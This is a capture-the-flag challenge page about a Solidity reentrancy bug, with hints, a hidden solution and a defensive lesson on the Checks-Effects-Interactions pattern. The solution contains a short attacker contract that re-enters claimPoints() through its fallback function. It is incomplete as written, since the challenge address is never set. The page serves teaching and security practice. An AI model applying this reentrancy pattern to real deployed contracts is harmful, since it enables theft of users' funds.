# Challenge 5: The Reentrancy Race

In this challenge, you need to accumulate enough points to mint a flag. However, points can only be claimed once... or can they?

## Contract Overview
The contract has three main functions:
- `claimPoints()`: Gives 1 point to the caller, but only if they haven't claimed before
- `resetPoints()`: Resets points to zero
- `mintFlag()`: Mints a flag if you have 10 or more points

## Hints
<details>
<summary>Hint 1</summary>
Notice the order of operations in <code>claimPoints()</code>. When does it check points? When does it update them?
</details>

<details>
<summary>Hint 2</summary>
The contract makes an external call before updating the points. What happens if we call back into the contract during this call?
</details>

<details>
<summary>Hint 3</summary>
The "Checks-Effects-Interactions" pattern isn't followed here. The state update happens after the external interaction!
</details>

## Solution
<details>
<summary>Click to reveal solution</summary>

Create a contract that recursively claims points through its fallback function:

<code>
contract Attacker {
    Challenge5 challenge;
    uint256 callCount = 0;

    fallback() external {
        if (callCount < 10) {
            callCount++;
            challenge.claimPoints();
        }
    }

    function attack() external {
        challenge.claimPoints();
    }
}
</code>

The attack works because:
1. Initial <code>claimPoints()</code> checks points (0)
2. Makes external call to our contract
3. Our fallback function calls <code>claimPoints()</code> again
4. Process repeats until we have enough points
5. State only updates after all recursive calls complete

Congratulations! You've exploited a classic reentrancy vulnerability! 🎉
</details>

Remember: Always update state BEFORE making external calls! The "Checks-Effects-Interactions" pattern exists to prevent exactly this type of vulnerability.

## Why This Matters
Reentrancy attacks are one of the most notorious vulnerabilities in smart contracts:

1. The DAO hack (2016, $60M lost) - The first major reentrancy attack that led to Ethereum's hard fork
2. The Cream Finance exploit (2021, $130M lost) - Complex reentrancy across multiple functions
3. The Fei Protocol hack (2022, $80M lost) - Reentrancy in flash loan functionality

This specific pattern of checking state, making an external call, and then updating state has led to numerous exploits.
